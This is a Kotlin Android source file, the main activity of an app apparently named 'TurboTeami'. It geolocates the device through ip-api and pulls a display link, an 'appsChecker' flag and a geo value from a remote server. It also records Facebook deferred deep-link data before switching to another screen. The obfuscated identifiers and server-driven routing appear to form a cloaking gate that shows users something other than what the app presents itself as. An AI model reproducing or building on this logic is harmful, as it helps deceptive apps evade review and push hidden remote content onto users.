package com.deuscraft.TurboTeami

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.deuscraft.TurboTeami.blocada.AbrstaClass
import com.deuscraft.TurboTeami.blocada.AbrstaClass.Companion.ASpdaspdpspadpsapdpsadp
import com.deuscraft.TurboTeami.blocada.AbrstaClass.Companion.geo
import com.deuscraft.TurboTeami.blocada.AdaInistra
import com.deuscraft.TurboTeami.blocada.Adapra
import com.deuscraft.TurboTeami.databinding.ActivityMainBinding
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var bindMainAct: ActivityMainBinding


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)

        deePP(this)

        val executorService = Executors.newSingleThreadScheduledExecutor()
        var countCo: String? = Hawk.get(ASpdaspdpspadpsapdpsadp, null)
        var ge: String? = Hawk.get(geo, null)
        executorService.scheduleAtFixedRate({
            if (countCo != null && ge != null) {
                executorService.shutdown()
                intMain()
            } else {
                countCo = Hawk.get(ASpdaspdpspadpsapdpsadp)
                ge = Hawk.get(geo)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            jobMain
        }
    }


    private suspend fun getDataDev() {

        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://enigmaticexcitement.live/")
            .build()
            .create(AdaInistra::class.java)
        val linkView = retroBuildTwo.getDataDev().body()?.view.toString()
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker.toString()
        val retroData = retroBuildTwo.getDataDev().body()?.geo.toString()


        Hawk.put(AbrstaClass.WQdpaspdpaspdpasdp, linkView)
        Hawk.put(AbrstaClass.WQPDapsdpaspdpaspdpsadp, appsChecker)
        Hawk.put(geo, retroData)

        Log.d("Data from Devil", linkView)
        Log.d("Data from Devil", appsChecker)
        Log.d("Data from Devil", retroData)

    }

    //Data API
    private suspend fun getData() {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(AdaInistra::class.java)
        val retData = retrofitBuilder.getData().body()?.countryCode
        Log.d("Data from API", retData.toString())

        Hawk.put(ASpdaspdpspadpsapdpsadp, retData)
    }

    private val jobMain: Job = GlobalScope.launch (Dispatchers.IO){
        getData()
        getDataDev()
    }

    private fun intMain() {
        val intent = Intent(this@MainActivity, Adapra::class.java)
        startActivity(intent)
        finish()
    }

    fun deePP(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host.toString()
                Hawk.put(AbrstaClass.DEEPL, params)
            }
            if (appLinkData == null) {
            }
        }
    }
}